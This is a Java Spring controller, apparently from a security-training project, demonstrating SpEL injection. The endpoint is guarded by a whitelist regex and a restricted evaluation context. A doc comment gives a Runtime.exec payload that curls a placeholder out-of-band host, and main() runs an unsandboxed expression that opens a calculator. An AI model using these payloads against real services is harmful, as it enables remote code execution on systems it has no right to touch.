package org.joychou.controller;

import org.joychou.util.WebUtils;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    private static final Pattern SAFE_EXPRESSION = Pattern.compile("^[A-Za-z0-9_+\\-*/%.\\s'<>=!&|?:\\[\\]]{1,200}$");

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // property/literal/operator syntax only: no calls, type refs (T(..)), variables, beans or constructors
        if (null == expression || !SAFE_EXPRESSION.matcher(expression).matches()) {
            return "Bad boy. I got u.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        // SimpleEvaluationContext disables type references, constructors and bean references
        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        Object result = parser.parseExpression(expression).getValue(context);
        return WebUtils.escapeHtml(String.valueOf(result));
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

